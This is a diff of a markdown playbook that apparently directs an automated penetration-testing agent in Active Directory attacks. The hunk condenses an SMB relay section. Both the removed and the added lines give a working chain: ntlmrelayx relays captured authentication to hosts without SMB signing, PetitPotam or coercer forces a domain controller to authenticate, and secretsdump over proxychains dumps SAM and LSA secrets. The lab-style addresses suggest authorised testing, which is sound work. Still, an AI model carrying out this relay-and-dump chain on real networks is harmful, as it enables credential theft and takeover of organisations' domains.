@@ -110,36 +110,10 @@ Coordinate with PrivEsc agent:
 3. Relay performs LDAP actions
 ```
 
-### For SMB Relay (When SMB Signing Disabled)
-**CRITICAL**: Only works when target has SMB signing disabled.
-Use smb_signing_check from recon to identify targets first.
-
-**Single Target:**
-```
-1. ntlmrelayx_to_smb(target_ip="192.168.58.50", socks=True)
-   → Start relay targeting host with SMB signing disabled
-2. petitpotam(target="dc.domain.local", listener="YOUR_IP")
-   → Coerce DC to authenticate to relay
-3. Relay captures DC auth and authenticates to target
-4. Use SOCKS proxy for tools:
-   proxychains secretsdump.py -no-pass DOMAIN/DC$@192.168.58.50
-   → Dump SAM/LSA from target using relayed DC session
-```
-
-**Multiple Targets:**
-```
-1. ntlmrelayx_multirelay(target_ips="192.168.58.50,192.168.58.51,192.168.58.52")
-   → Relay to all SMB-unsigned hosts
-2. Run coercion to trigger auth
-3. Successful relays appear in SOCKS proxy
-4. Use proxychains to interact with each relayed session
-```
-
-**Why SMB Relay is Powerful:**
-- Relay admin creds → get local admin on target
-- Relay DC$ account → dump secrets from target
-- No password cracking needed
-- Works even with strong passwords
+### For SMB Relay (SMB Signing Disabled Required)
+1. `ntlmrelayx_to_smb(target_ip=..., socks=True)` or `ntlmrelayx_multirelay(target_ips=...)`
+2. `petitpotam` or `coercer` to trigger auth
+3. Use SOCKS proxy: `proxychains secretsdump.py -no-pass DOMAIN/USER@TARGET`
 
 ### SOCKS Relay (Interactive Sessions)
 Capture and reuse SMB sessions for multiple tools:
